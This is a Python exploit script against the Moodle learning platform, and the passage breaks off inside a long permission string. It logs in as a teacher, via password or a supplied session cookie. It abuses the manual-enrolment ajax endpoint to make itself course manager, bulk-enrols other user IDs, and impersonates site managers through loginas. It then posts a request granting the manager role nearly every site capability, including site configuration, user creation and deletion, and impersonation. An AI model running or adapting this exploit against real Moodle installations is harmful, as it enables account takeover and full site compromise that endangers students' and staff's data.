#!/usr/bin/python3
import sys
import requests
import re
import argparse
import binascii

#proxies = {"http": "http://127.0.0.1:8080","https": "http://127.0.0.1:8080"}
headers={"Content-Type":"application/x-www-form-urlencoded"}
proxies={}

def try_teacher_login(url, uname, upass,cookie):
    #print(cookie)
    session=requests.Session()
    if cookie != "None":
        print('[+] Logging in to teacher')
        session.cookies.set('MoodleSession', cookie)
        r=session.get(url+"/my/",proxies=proxies,allow_redirects=False)
        if "login/index.php" in r.text:
            print("[!] Teacher logins failure!")
            sys.exit(1)
        print("[+] Teacher logins successfully!")
        #print(session.cookies.get())
        return session
    else:
        login_url = url + '/login/index.php'
        print('[+] Logging in to teacher')
        r=session.get(login_url)
        login_token = re.findall(r'name="logintoken" value="(.*?)"', r.text)[0]
        #print(login_token)
        data = {
            "anchor" : "",
            "logintoken":login_token,
            "username": uname,
            "password": upass
        }
        
        resp =session.post(login_url, data=data,proxies=proxies,headers=headers,verify=False)
        if "Recently accessed courses" not in resp.text:
            print("[!] Teacher logins failure!")
            sys.exit(1)
        print("[+] Teacher logins successfully!")
        return session

def privilegeEscalationToManagerCourse(url,sess):
    # get your id
    profile_url=url + "/user/profile.php"
    r=sess.get(profile_url,proxies=proxies)
    id_user=re.findall(r'id=(\d)', r.text)[0]
    #print(id_user)
    # get your course
    id_course=re.findall(r'course=(\d)', r.text)[0]
    #print(id_course)
    # now privilege Escalation To Manager in the course
    sess_key = re.findall(r'"sesskey":"(.*?)"', r.text)[0]
    #print(sess_key)
    r=sess.get(url+"/user/index.php?id="+id_course)
    enrolid=re.findall(r'name="enrolid" value="(.*?)"', r.text)[0]
    data= {
        "mform_showmore_main" : "0",
        "id" : id_course,
        "action" : "enrol",
        "enrolid" : enrolid,
        "sesskey" : sess_key,
        "_qf__enrol_manual_enrol_users_form" : "1",
        "mform_showmore_id_main" : "0", 
        "userlist[]" : id_user, 
        "roletoassign" : "1",
        "startdate" : "4",
        "duration" : ""
    }
    r = sess.get(url + "/enrol/manual/ajax.php", params=data,proxies=proxies)
    # check valid
    if "success" not in r.text:
        print("[-] Exploitation was failed! It was fixed!")
        sys.exit(1)
    print("[+] Privilege Escalation To Manager in the course Done!")
    # Add Manager site to teacher course
    # loop to add manager id: make sure that not ignore managerid
    for i in range(2,100):
        if i==int(id_user): continue
        data= {
                "mform_showmore_main" : "0",
                "id" : id_course,
                "action" : "enrol",
                "enrolid" : enrolid,
                "sesskey" : sess_key,
                "_qf__enrol_manual_enrol_users_form" : "1",
                "mform_showmore_id_main" : "0", 
                "userlist[]" : i, 
                "roletoassign" : "5",
                "startdate" : "4",
                "duration" : ""
                 }
        sess.get(url + "/enrol/manual/ajax.php", params=data,proxies=proxies)
    # find manager id
    r=sess.get(url+"/user/index.php?id="+id_course)
    context_id=re.findall(r'contextid=(\d*)', r.text)[0]
    #print(contextid)
    #get user with Manager role
    get_user=url + "/user/index.php?contextid="+context_id+"&roleid=1"
    r=sess.get(get_user,proxies=proxies)
    manager_id=re.findall(r'''id=(\d)&amp;course''', r.text)
    #print(manager_id)
    for i in manager_id:
        if(i==id_user): continue
        # check loginasManagerSite
        url_loginas=url+"/course/loginas.php?id="+id_course+"&user="+i+"&sesskey="+sess_key
        r=sess.get(url_loginas,proxies=proxies)
        # now new user, new sesskey
        new_sess_key=re.findall(r'"sesskey":"(.*?)"', r.text)[0]
        # get full permissions
        data ="sesskey="+new_sess_key+"""&return=manage&resettype=none&shortname=manager&name=&description=&archetype=manager&contextlevel10=0&contextlevel10=1&contextlevel30=0&contextlevel30=1&contextlevel40=0&contextlevel40=1&contextlevel50=0&contextlevel50=1&contextlevel70=0&contextlevel70=1&contextlevel80=0&contextlevel80=1&allowassign%5B%5D=&allowassign%5B%5D=1&allowassign%5B%5D=2&allowassign%5B%5D=3&allowassign%5B%5D=4&allowassign%5B%5D=5&allowassign%5B%5D=6&allowassign%5B%5D=7&allowassign%5B%5D=8&allowoverride%5B%5D=&allowoverride%5B%5D=1&allowoverride%5B%5D=2&allowoverride%5B%5D=3&allowoverride%5B%5D=4&allowoverride%5B%5D=5&allowoverride%5B%5D=6&allowoverride%5B%5D=7&allowoverride%5B%5D=8&allowswitch%5B%5D=&allowswitch%5B%5D=1&allowswitch%5B%5D=2&allowswitch%5B%5D=3&allowswitch%5B%5D=4&allowswitch%5B%5D=5&allowswitch%5B%5D=6&allowswitch%5B%5D=7&allowswitch%5B%5D=8&allowview%5B%5D=&allowview%5B%5D=1&allowview%5B%5D=2&allowview%5B%5D=3&allowview%5B%5D=4&allowview%5B%5D=5&allowview%5B%5D=6&allowview%5B%5D=7&allowview%5B%5D=8&block%2Fadmin_bookmarks%3Amyaddinstance=1&block%2Fbadges%3Amyaddinstance=1&block%2Fcalendar_month%3Amyaddinstance=1&block%2Fcalendar_upcoming%3Amyaddinstance=1&block%2Fcomments%3Amyaddinstance=1&block%2Fcourse_list%3Amyaddinstance=1&block%2Fglobalsearch%3Amyaddinstance=1&block%2Fglossary_random%3Amyaddinstance=1&block%2Fhtml%3Amyaddinstance=1&block%2Flp%3Aaddinstance=1&block%2Flp%3Amyaddinstance=1&block%2Fmentees%3Amyaddinstance=1&block%2Fmnet_hosts%3Amyaddinstance=1&block%2Fmyoverview%3Amyaddinstance=1&block%2Fmyprofile%3Amyaddinstance=1&block%2Fnavigation%3Amyaddinstance=1&block%2Fnews_items%3Amyaddinstance=1&block%2Fonline_users%3Amyaddinstance=1&block%2Fprivate_files%3Amyaddinstance=1&block%2Frecentlyaccessedcourses%3Amyaddinstance=1&block%2Frecentlyaccesseditems%3Amyaddinstance=1&block%2Frss_client%3Amyaddinstance=1&block%2Fsettings%3Amyaddinstance=1&block%2Fstarredcourses%3Amyaddinstance=1&block%2Ftags%3Amyaddinstance=1&block%2Ftimeline%3Amyaddinstance=1&enrol%2Fcategory%3Asynchronised=1&message%2Fairnotifier%3Amanagedevice=1&moodle%2Fanalytics%3Alistowninsights=1&moodle%2Fanalytics%3Amanagemodels=1&moodle%2Fbadges%3Amanageglobalsettings=1&moodle%2Fblog%3Acreate=1&moodle%2Fblog%3Amanageentries=1&moodle%2Fblog%3Amanageexternal=1&moodle%2Fblog%3Asearch=1&moodle%2Fblog%3Aview=1&moodle%2Fblog%3Aviewdrafts=1&moodle%2Fcourse%3Aconfigurecustomfields=1&moodle%2Fcourse%3Arecommendactivity=1&moodle%2Fgrade%3Amanagesharedforms=1&moodle%2Fgrade%3Asharegradingforms=1&moodle%2Fmy%3Aconfigsyspages=1&moodle%2Fmy%3Amanageblocks=1&moodle%2Fportfolio%3Aexport=1&moodle%2Fquestion%3Aconfig=1&moodle%2Frestore%3Acreateuser=1&moodle%2Frole%3Amanage=1&moodle%2Fsearch%3Aquery=1&moodle%2Fsite%3Aconfig=1&moodle%2Fsite%3Aconfigview=1&moodle%2Fsite%3Adeleteanymessage=1&moodle%2Fsite%3Adeleteownmessage=1&moodle%2Fsite%3Adoclinks=1&moodle%2Fsite%3Aforcelanguage=1&moodle%2Fsite%3Amaintenanceaccess=1&moodle%2Fsite%3Amanageallmessaging=1&moodle%2Fsite%3Amessageanyuser=1&moodle%2Fsite%3Amnetlogintoremote=1&moodle%2Fsite%3Areadallmessages=1&moodle%2Fsite%3Asendmessage=1&moodle%2Fsite%3Auploadusers=1&moodle%2Fsite%3Aviewparticipants=1&moodle%2Ftag%3Aedit=1&moodle%2Ftag%3Aeditblocks=1&moodle%2Ftag%3Aflag=1&moodle%2Ftag%3Amanage=1&moodle%2Fuser%3Achangeownpassword=1&moodle%2Fuser%3Acreate=1&moodle%2Fuser%3Adelete=1&moodle%2Fuser%3Aeditownmessageprofile=1&moodle%2Fuser%3Aeditownprofile=1&moodle%2Fuser%3Aignoreuserquota=1&moodle%2Fuser%3Amanageownblocks=1&moodle%2Fuser%3Amanageownfiles=1&moodle%2Fuser%3Amanagesyspages=1&moodle%2Fuser%3Aupdate=1&moodle%2Fwebservice%3Acreatemobiletoken=1&moodle%2Fwebservice%3Acreatetoken=1&moodle%2Fwebservice%3Amanagealltokens=1&quizaccess%2Fseb%3Amanagetemplates=1&report%2Fcourseoverview%3Aview=1&report%2Fperformance%3Aview=1&report%2Fquestioninstances%3Aview=1&report%2Fsecurity%3Aview=1&report%2Fstatus%3Aview=1&tool%2Fcustomlang%3Aedit=1&tool%2Fcustomlang%3Aview=1&tool%2Fdataprivacy%3Amanagedataregistry=1&tool%2Fdataprivacy%3Amanagedatarequests=1&tool%2Fdataprivacy%3Arequestdeleteforotheruser=1&tool%2Flpmigrate%3Aframeworksmigrate=1&tool%2Fmonitor%3Amanagetool=1&tool%2Fpolicy%3Aaccept=1&tool%2Fpolicy%3Amanagedocs=1&tool%2Fpolicy%3Aviewacceptances=1&tool%2Fuploaduser%3Auploaduserpictures=1&tool%2Fusertours%3Amanagetours=1&auth%2Foauth2%3Amanagelinkedlogins=1&moodle%2Fbadges%3Amanageownbadges=1&moodle%2Fbadges%3Aviewotherbadges=1&moodle%2Fcompetency%3Aevidencedelete=1&moodle%2Fcompetency%3Aplancomment=1&moodle%2Fcompetency%3Aplancommentown=1&moodle%2Fcompetency%3Aplanmanage=1&moodle%2Fcompetency%3Aplanmanagedraft=1&moodle%2Fcompetency%3Aplanmanageown=1&moodle%2Fcompetency%3Aplanmanageowndraft=1&moodle%2Fcompetency%3Aplanrequestreview=1&moodle%2Fcompetency%3Aplanrequestreviewown=1&moodle%2Fcompetency%3Aplanreview=1&moodle%2Fcompetency%3Aplanview=1&moodle%2Fcompetency%3Aplanviewdraft=1&moodle%2Fcompetency%3Aplanviewown=1&moodle%2Fcompetency%3Aplanviewowndraft=1&moodle%2Fcompetency%3Ausercompetencycomment=1&moodle%2Fcompetency%3Ausercompetencycommentown=1&moodle%2Fcompetency%3Ausercompetencyrequestreview=1&moodle%2Fcompetency%3Ausercompetencyrequestreviewown=1&moodle%2Fcompetency%3Ausercompetencyreview=1&moodle%2Fcompetency%3Ausercompetencyview=1&moodle%2Fcompetency%3Auserevidencemanage=1&moodle%2Fcompetency%3Auserevidencemanageown=0&moodle%2Fcompetency%3Auserevidenceview=1&moodle%2Fuser%3Aeditmessageprofile=1&moodle%2Fuser%3Aeditprofile=1&moodle%2Fuser%3Amanageblocks=1&moodle%2Fuser%3Areaduserblogs=1&moodle%2Fuser%3Areaduserposts=1&moodle%2Fuser%3Aviewalldetails=1&moodle%2Fuser%3Aviewlastip=1&moodle%2Fuser%3Aviewuseractivitiesreport=1&report%2Fusersessions%3Amanageownsessions=1&tool%2Fdataprivacy%3Adownloadallrequests=1&tool%2Fdataprivacy%3Adownloadownrequest=1&tool%2Fdataprivacy%3Amakedatadeletionrequestsforchildren=1&tool%2Fdataprivacy%3Amakedatarequestsforchildren=1&tool%2Fdataprivacy%3Arequestdelete=1&tool%2Fpolicy%3Aacceptbehalf=1&moodle%2Fcategory%3Amanage=1&moodle%2Fcategory%3Aviewcourselist=1&moodle%2Fcategory%3Aviewhiddencategories=1&moodle%2Fcohort%3Aassign=1&moodle%2Fcohort%3Amanage=1&moodle%2Fcompetency%3Acompetencymanage=1&moodle%2Fcompetency%3Acompetencyview=1&moodle%2Fcompetency%3Atemplatemanage=1&moodle%2Fcompetency%3Atemplateview=1&moodle%2Fcourse%3Acreate=1&moodle%2Fcourse%3Arequest=1&moodle%2Fsite%3Aapprovecourse=1&repository%2Fcontentbank%3Aaccesscoursecategorycontent=1&repository%2Fcontentbank%3Aaccessgeneralcontent=1&block%2Frecent_activity%3Aviewaddupdatemodule=1&block%2Frecent_activity%3Aviewdeletemodule=1&contenttype%2Fh5p%3Aaccess=1&contenttype%2Fh5p%3Aupload=1&contenttype%2Fh5p%3Auseeditor=1&enrol%2Fcategory%3Aconfig=1&enrol%2Fcohort%3Aconfig=1&enrol%2Fcohort%3Aunenrol=1&enrol%2Fdatabase%3Aconfig=1&enrol%2Fdatabase%3Aunenrol=1&enrol%2Fflatfile%3Amanage=1&enrol%2Fflatfile%3Aunenrol=1&enrol%2Fguest%3Aconfig=1&enrol%2Fimsenterprise%3Aconfig=1&enrol%2Fldap%3Amanage=1&enrol%2Flti%3Aconfig=1&enrol%2Flti%3Aunenrol=1&enrol%2Fmanual%3Aconfig=1&enrol%2Fmanual%3Aenrol=1&enrol%2Fmanual%3Amanage=1&enrol%2Fmanual%3Aunenrol=1&enrol%2Fmanual%3Aunenrolself=1&enrol%2Fmeta%3Aconfig=1&enrol%2Fmeta%3Aselectaslinked=1&enrol%2Fmeta%3Aunenrol=1&enrol%2Fmnet%3Aconfig=1&enrol%2Fpaypal%3Aconfig=1&enrol%2Fpaypal%3Amanage=1&enrol%2Fpaypal%3Aunenrol=1&enrol%2Fpaypal%3Aunenrolself=1&enrol%2Fself%3Aconfig=1&enrol%2Fself%3Aholdkey=1&enrol%2Fself%3Amanage=1&enrol%2Fself%3Aunenrol=1&enrol%2Fself%3Aunenrolself=1&gradeexport%2Fods%3Apublish=1&gradeexport%2Fods%3Aview=1&gradeexport%2Ftxt%3Apublish=1&gradeexport%2Ftxt%3Aview=1&gradeexport%2Fxls%3Apublish=1&gradeexport%2Fxls%3Aview=1&gradeexport%2Fxml%3Apublish=1&gradeexport%2Fxml%3Aview=1&gradeimport%2Fcsv%3Aview=1&gradeimport%2Fdirect%3Aview=1&gradeimport%2Fxml%3Apublish=1&gradeimport%2Fxml%3Aview=1&gradereport%2Fgrader%3Aview=1&gradereport%2Fhistory%3Aview=1&gradereport%2Foutcomes%3Aview=1&gradereport%2Foverview%3Aview=1&gradereport%2Fsingleview%3Aview=1&gradereport%2Fuser%3Aview=1&mod%2Fassign%3Aaddinstance=1&mod%2Fassignment%3Aaddinstance=1&mod%2Fbook%3Aaddinstance=1&mod%2Fchat%3Aaddinstance=1&mod%2Fchoice%3Aaddinstance=1&mod%2Fdata%3Aaddinstance=1&mod%2Ffeedback%3Aaddinstance=1&mod%2Ffolder%3Aaddinstance=1&mod%2Fforum%3Aaddinstance=1&mod%2Fglossary%3Aaddinstance=1&mod%2Fh5pactivity%3Aaddinstance=1&mod%2Fimscp%3Aaddinstance=1&mod%2Flabel%3Aaddinstance=1&mod%2Flesson%3Aaddinstance=1&mod%2Flti%3Aaddcoursetool=1&mod%2Flti%3Aaddinstance=1&mod%2Flti%3Aaddmanualinstance=1&mod%2Flti%3Aaddpreconfiguredinstance=1&mod%2Flti%3Arequesttooladd=1&mod%2Fpage%3Aaddinstance=1&mod%2Fquiz%3Aaddinstance=1&mod%2Fresource%3Aaddinstance=1&mod%2Fscorm%3Aaddinstance=1&mod%2Fsurvey%3Aaddinstance=1&mod%2Furl%3Aaddinstance=1&mod%2Fwiki%3Aaddinstance=1&mod%2Fworkshop%3Aaddinstance=1&moodle%2Fanalytics%3Alistinsights=1&moodle%2Fbackup%3Aanonymise=1&moodle%2Fbackup%3Abackupcourse=1&moodle%2Fbackup%3Abackupsection=1&moodle%2Fbackup%3Abackuptargetimport=1&moodle%2Fbackup%3Aconfigure=1&moodle%2Fbackup%3Adownloadfile=1&moodle%2Fbackup%3Auserinfo=1&moodle%2Fbadges%3Aawardbadge=1&moodle%2Fbadges%3Aconfigurecriteria=1&moodle%2Fbadges%3Aconfiguredetails=1&moodle%2Fbadges%3Aconfiguremessages=1&moodle%2Fbadges%3Acreatebadge=1&moodle%2Fbadges%3Adeletebadge=1&moodle%2Fbadges%3Aearnbadge=1&moodle%2Fbadges%3Arevokebadge=1&moodle%2Fbadges%3Aviewawarded=1&moodle%2Fbadges%3Aviewbadges=1&moodle%2Fcalendar%3Amanageentries=1&moodle%2Fcalendar%3Amanagegroupentries=1&moodle%2Fcalendar%3Amanageownentries=1&moodle%2Fcohort%3Aview=1&moodle%2Fcomment%3Adelete=1&moodle%2Fcomment%3Apost=1&moodle%2Fcomment%3Aview=1&moodle%2Fcompetency%3Acompetencygrade=1&moodle%2Fcompetency%3Acoursecompetencygradable=1&moodle%2Fcompetency%3Acoursecompetencymanage=1&moodle%2Fcompetency%3Acoursecompetencyview=1&moodle%2Fcontentbank%3Aaccess=1&moodle%2Fcontentbank%3Adeleteanycontent=1&moodle%2Fcontentbank%3Adeleteowncontent=1&moodle%2Fcontentbank%3Amanageanycontent=1&moodle%2Fcontentbank%3Amanageowncontent=1&moodle%2Fcontentbank%3Aupload=1&moodle%2Fcontentbank%3Auseeditor=1&moodle%2Fcourse%3Abulkmessaging=1&moodle%2Fcourse%3Achangecategory=1&moodle%2Fcourse%3Achangefullname=1&moodle%2Fcourse%3Achangeidnumber=1&moodle%2Fcourse%3Achangelockedcustomfields=1&moodle%2Fcourse%3Achangeshortname=1&moodle%2Fcourse%3Achangesummary=1&moodle%2Fcourse%3Acreategroupconversations=1&moodle%2Fcourse%3Adelete=1&moodle%2Fcourse%3Aenrolconfig=1&moodle%2Fcourse%3Aenrolreview=1&moodle%2Fcourse%3Aignorefilesizelimits=1&moodle%2Fcourse%3Aisincompletionreports=1&moodle%2Fcourse%3Amanagefiles=1&moodle%2Fcourse%3Amanagegroups=1&moodle%2Fcourse%3Amanagescales=1&moodle%2Fcourse%3Amarkcomplete=1&moodle%2Fcourse%3Amovesections=1&moodle%2Fcourse%3Aoverridecompletion=1&moodle%2Fcourse%3Arenameroles=1&moodle%2Fcourse%3Areset=1&moodle%2Fcourse%3Areviewotherusers=1&moodle%2Fcourse%3Asectionvisibility=1&moodle%2Fcourse%3Asetcurrentsection=1&moodle%2Fcourse%3Asetforcedlanguage=1&moodle%2Fcourse%3Atag=1&moodle%2Fcourse%3Aupdate=1&moodle%2Fcourse%3Auseremail=1&moodle%2Fcourse%3Aview=1&moodle%2Fcourse%3Aviewhiddencourses=1&moodle%2Fcourse%3Aviewhiddensections=1&moodle%2Fcourse%3Aviewhiddenuserfields=1&moodle%2Fcourse%3Aviewparticipants=1&moodle%2Fcourse%3Aviewscales=1&moodle%2Fcourse%3Aviewsuspendedusers=1&moodle%2Fcourse%3Avisibility=1&moodle%2Ffilter%3Amanage=1&moodle%2Fgrade%3Aedit=1&moodle%2Fgrade%3Aexport=1&moodle%2Fgrade%3Ahide=1&moodle%2Fgrade%3Aimport=1&moodle%2Fgrade%3Alock=1&moodle%2Fgrade%3Amanage=1&moodle%2Fgrade%3Amanagegradingforms=1&moodle%2Fgrade%3Amanageletters=1&moodle%2Fgrade%3Amanageoutcomes=1&moodle%2Fgrade%3Aunlock=1&moodle%2Fgrade%3Aview=1&moodle%2Fgrade%3Aviewall=1&moodle%2Fgrade%3Aviewhidden=1&moodle%2Fnotes%3Amanage=1&moodle%2Fnotes%3Aview=1&moodle%2Fquestion%3Aadd=1&moodle%2Fquestion%3Aeditall=1&moodle%2Fquestion%3Aeditmine=1&moodle%2Fquestion%3Aflag=1&moodle%2Fquestion%3Amanagecategory=1&moodle%2Fquestion%3Amoveall=1&moodle%2Fquestion%3Amovemine=1&moodle%2Fquestion%3Atagall=1&moodle%2Fquestion%3Atagmine=1&moodle%2Fquestion%3Auseall=1&moodle%2Fquestion%3Ausemine=1&moodle%2Fquestion%3Aviewall=1&moodle%2Fquestion%3Aviewmine=1&moodle%2Frating%3Arate=1&moodle%2Frating%3Aview=1&moodle%2Frating%3Aviewall=1&moodle%2Frating%3Aviewany=1&moodle%2Frestore%3Aconfigure=1&moodle%2Frestore%3Arestoreactivity=1&moodle%2Frestore%3Arestorecourse=1&moodle%2Frestore%3Arestoresection=1&moodle%2Frestore%3Arestoretargetimport=1&moodle%2Frestore%3Arolldates=1&moodle%2Frestore%3Auploadfile=1&moodle%2Frestore%3Auserinfo=1&moodle%2Frestore%3Aviewautomatedfilearea=1&moodle%2Frole%3Aassign=1&moodle%2Frole%3Aoverride=1&moodle%2Frole%3Areview=1&moodle%2Frole%3Asafeoverride=1&moodle%2Frole%3Aswitchroles=1&moodle%2Fsite%3Aviewreports=1&moodle%2Fuser%3Aloginas=1&moodle%2Fuser%3Aviewdetails=1&moodle%2Fuser%3Aviewhiddendetails=1&report%2Fcompletion%3Aview=1&report%2Flog%3Aview=1&report%2Flog%3Aviewtoday=1&report%2Floglive%3Aview=1&report%2Foutline%3Aview=1&report%2Foutline%3Aviewuserreport=1&report%2Fparticipation%3Aview=1&report%2Fprogress%3Aview=1&report%2Fstats%3Aview=1&repository%2Fcontentbank%3Aaccesscoursecontent=1&tool%2Fmonitor%3Amanagerules=1&tool%2Fmonitor%3Asubscribe=1&tool%2Frecyclebin%3Adeleteitems=1&tool%2Frecyclebin%3Arestoreitems=1&tool%2Frecyclebin%3Aviewitems=1&webservice%2Frest%3Ause=1&webservice%2Fsoap%3Ause=1&webservice%2Fxmlrpc%3Ause=1&atto%2Fh5p%3Aaddembed=1&atto%2Frecordrtc%3Arecordaudio=1&atto%2Frecordrtc%3Arecordvideo=1&booktool%2Fexportimscp%3Aexport=1&booktool%2Fimporthtml%3Aimport=1&booktool%2Fprint%3Aprint=1&forumreport%2Fsummary%3Aview=1&forumreport%2Fsummary%3Aviewall=1&mod%2Fassign%3Aeditothersubmission=1&mod%2Fassign%3Aexportownsubmission=1&mod%2Fassign%3Agrade=1&mod%2Fassign%3Agrantextension=1&mod%2Fassign%3Amanageallocations=1&mod%2Fassign%3Amanagegrades=1&mod%2Fassign%3Amanageoverrides=1&mod%2Fassign%3Areceivegradernotifications=1&mod%2Fassign%3Areleasegrades=1&mod%2Fassign%3Arevealidentities=1&mod%2Fassign%3Areviewgrades=1&mod%2Fassign%3Ashowhiddengrader=1&mod%2Fassign%3Asubmit=1&mod%2Fassign%3Aview=1&mod%2Fassign%3Aviewblinddetails=1&mod%2Fassign%3Aviewgrades=1&mod%2Fassignment%3Aexportownsubmission=1&mod%2Fassignment%3Agrade=1&mod%2Fassignment%3Asubmit=1&mod%2Fassignment%3Aview=1&mod%2Fbook%3Aedit=1&mod%2Fbook%3Aread=1&mod%2Fbook%3Aviewhiddenchapters=1&mod%2Fchat%3Achat=1&mod%2Fchat%3Adeletelog=1&mod%2Fchat%3Aexportparticipatedsession=1&mod%2Fchat%3Aexportsession=1&mod%2Fchat%3Areadlog=1&mod%2Fchat%3Aview=1&mod%2Fchoice%3Achoose=1&mod%2Fchoice%3Adeleteresponses=1&mod%2Fchoice%3Adownloadresponses=1&mod%2Fchoice%3Areadresponses=1&mod%2Fchoice%3Aview=1&mod%2Fdata%3Aapprove=1&mod%2Fdata%3Acomment=1&mod%2Fdata%3Aexportallentries=1&mod%2Fdata%3Aexportentry=1&mod%2Fdata%3Aexportownentry=1&mod%2Fdata%3Aexportuserinfo=1&mod%2Fdata%3Amanagecomments=1&mod%2Fdata%3Amanageentries=1&mod%2Fdata%3Amanagetemplates=1&mod%2Fdata%3Amanageuserpresets=1&mod%2Fdata%3Arate=1&mod%2Fdata%3Aview=1&mod%2Fdata%3Aviewallratings=1&mod%2Fdata%3Aviewalluserpresets=1&mod%2Fdata%3Aviewanyrating=1&mod%2Fdata%3Aviewentry=1&mod%2Fdata%3Aviewrating=1&mod%2Fdata%3Awriteentry=1&mod%2Ffeedback%3Acomplete=1&mod%2Ffeedback%3Acreateprivatetemplate=1&mod%2Ffeedback%3Acreatepublictemplate=1&mod%2Ffeedback%3Adeletesubmissions=1&mod%2Ffeedback%3Adeletetemplate=1&mod%2Ffeedback%3Aedititems=1&mod%2Ffeedback%3Amapcourse=1&mod%2Ffeedback%3Areceivemail=1&mod%2Ffeedback%3Aview=1&mod%2Ffeedback%3Aviewanalysepage=1&mod%2Ffeedback%3Aviewreports=1&mod%2Ffolder%3Amanagefiles=1&mod%2Ffolder%3Aview=1&mod%2Fforum%3Aaddnews=1&mod%2Fforum%3Aaddquestion=1&mod%2Fforum%3Aallowforcesubscribe=1&mod%2Fforum%3Acanoverridecutoff=1&mod%2Fforum%3Acanoverridediscussionlock=1&mod%2Fforum%3Acanposttomygroups=1&mod%2Fforum%3Acantogglefavourite=1&mod%2Fforum%3Acreateattachment=1&mod%2Fforum%3Adeleteanypost=1&mod%2Fforum%3Adeleteownpost=1&mod%2Fforum%3Aeditanypost=1&mod%2Fforum%3Aexportdiscussion=1&mod%2Fforum%3Aexportforum=1&mod%2Fforum%3Aexportownpost=1&mod%2Fforum%3Aexportpost=1&mod%2Fforum%3Agrade=1&mod%2Fforum%3Amanagesubscriptions=1&mod%2Fforum%3Amovediscussions=1&mod%2Fforum%3Apindiscussions=1&mod%2Fforum%3Apostprivatereply=1&mod%2Fforum%3Apostwithoutthrottling=1&mod%2Fforum%3Arate=1&mod%2Fforum%3Areadprivatereplies=1&mod%2Fforum%3Areplynews=1&mod%2Fforum%3Areplypost=1&mod%2Fforum%3Asplitdiscussions=1&mod%2Fforum%3Astartdiscussion=1&mod%2Fforum%3Aviewallratings=1&mod%2Fforum%3Aviewanyrating=1&mod%2Fforum%3Aviewdiscussion=1&mod%2Fforum%3Aviewhiddentimedposts=1&mod%2Fforum%3Aviewqandawithoutposting=1&mod%2Fforum%3Aviewrating=1&mod%2Fforum%3Aviewsubscribers=1&mod%2Fglossary%3Aapprove=1&mod%2Fglossary%3Acomment=1&mod%2Fglossary%3Aexport=1&mod%2Fglossary%3Aexportentry=1&mod%2Fglossary%3Aexportownentry=1&mod%2Fglossary%3Aimport=1&mod%2Fglossary%3Amanagecategories=1&mod%2Fglossary%3Amanagecomments=1&mod%2Fglossary%3Amanageentries=1&mod%2Fglossary%3Arate=1&mod%2Fglossary%3Aview=1&mod%2Fglossary%3Aviewallratings=1&mod%2Fglossary%3Aviewanyrating=1&mod%2Fglossary%3Aviewrating=1&mod%2Fglossary%3Awrite=1&mod%2Fh5pactivity%3Areviewattempts=1&mod%2Fh5pactivity%3Asubmit=1&mod%2Fh5pactivity%3Aview=1&mod%2Fimscp%3Aview=1&mod%2Flabel%3Aview=1&mod%2Flesson%3Aedit=1&mod%2Flesson%3Agrade=1&mod%2Flesson%3Amanage=1&mod%2Flesson%3Amanageoverrides=1&mod%2Flesson%3Aview=1&mod%2Flesson%3Aviewreports=1&mod%2Flti%3Aadmin=1&mod%2Flti%3Amanage=1&mod%2Flti%3Aview=1&mod%2Fpage%3Aview=1&mod%2Fquiz%3Aattempt=1&mod%2Fquiz%3Adeleteattempts=1&mod%2Fquiz%3Aemailconfirmsubmission=1&mod%2Fquiz%3Aemailnotifysubmission=1&mod%2Fquiz%3Aemailwarnoverdue=1&mod%2Fquiz%3Agrade=1&mod%2Fquiz%3Aignoretimelimits=1&mod%2Fquiz%3Amanage=1&mod%2Fquiz%3Amanageoverrides=1&mod%2Fquiz%3Apreview=1&mod%2Fquiz%3Aregrade=1&mod%2Fquiz%3Areviewmyattempts=1&mod%2Fquiz%3Aview=1&mod%2Fquiz%3Aviewreports=1&mod%2Fresource%3Aview=1&mod%2Fscorm%3Adeleteownresponses=1&mod%2Fscorm%3Adeleteresponses=1&mod%2Fscorm%3Asavetrack=1&mod%2Fscorm%3Askipview=1&mod%2Fscorm%3Aviewreport=1&mod%2Fscorm%3Aviewscores=1&mod%2Fsurvey%3Adownload=1&mod%2Fsurvey%3Aparticipate=1&mod%2Fsurvey%3Areadresponses=1&mod%2Furl%3Aview=1&mod%2Fwiki%3Acreatepage=1&mod%2Fwiki%3Aeditcomment=1&mod%2Fwiki%3Aeditpage=1&mod%2Fwiki%3Amanagecomment=1&mod%2Fwiki%3Amanagefiles=1&mod%2Fwiki%3Amanagewiki=1&mod%2Fwiki%3Aoverridelock=1&mod%2Fwiki%3Aviewcomment=1&mod%2Fwiki%3Aviewpage=1&mod%2Fworkshop%3Aallocate=1&mod%2Fworkshop%3Adeletesubmissions=1&mod%2Fworkshop%3Aeditdimensions=1&mod%2Fworkshop%3Aexportsubmissions=1&mod%2Fworkshop%3Aignoredeadlines=1&mod%2Fworkshop%3Amanageexamples=1&mod%2Fworkshop%3Aoverridegrades=1&mod%2Fworkshop%3Apeerassess=1&mod%2Fworkshop%3Apublishsubmissions=1&mod%2Fworkshop%3Asubmit=1&mod%2Fworkshop%3Aswitchphase=1&mod%2Fworkshop%3Aview=1&mod%2Fworkshop%3Aviewallassessments=1&mod%2Fworkshop%3Aviewallsubmissions=1&mod%2Fworkshop%3Aviewauthornames=1&mod%2Fworkshop%3Aviewauthorpublished=1&mod%2Fworkshop%3Aviewpublishedsubmissions=1&mod%2Fworkshop%3Aviewreviewernames=1&moodle%2Fbackup%3Abackupactivity=1&moodle%2Fcompetency%3Acoursecompetencyconfigure=1&moodle%2Fcourse%3Aactivityvisibility=1&moodle%2Fcourse%3Aignoreavailabilityrestrictions=1&moodle%2Fcourse%3Amanageactivities=1&moodle%2Fcourse%3Atogglecompletion=1&moodle%2Fcourse%3Aviewhiddenactivities=1&moodle%2Fh5p%3Adeploy=1&moodle%2Fh5p%3Asetdisplayoptions=1&moodle%2Fh5p%3Aupdatelibraries=1&moodle%2Fsite%3Aaccessallgroups=1&moodle%2Fsite%3Amanagecontextlocks=1&moodle%2Fsite%3Atrustcontent=1&moodle%2Fsite%3Aviewanonymousevents=1&moodle%2Fsite%3Aviewfullnames=1&moodle%2Fsite%3Aviewuseridentity=1&quiz%2Fgrading%3Aviewidnumber=1&quiz%2Fgrading%3Aviewstudentnames=1&quiz%2Fstatistics%3Aview=1&quizaccess%2Fseb%3Abypassseb=1&quizaccess%2Fseb%3Amanage_filemanager_sebconfigfile=1&quizaccess%2Fseb%3Amanage_seb_activateurlfiltering=1&quizaccess%2Fseb%3Amanage_seb_allowedbrowserexamkeys=1&quizaccess%2Fseb%3Amanage_seb_allowreloadinexam=1&quizaccess%2Fseb%3Amanage_seb_allowspellchecking=1&quizaccess%2Fseb%3Amanage_seb_allowuserquitseb=1&quizaccess%2Fseb%3Amanage_seb_enableaudiocontrol=1&quizaccess%2Fseb%3Amanage_seb_expressionsallowed=1&quizaccess%2Fseb%3Amanage_seb_expressionsblocked=1&quizaccess%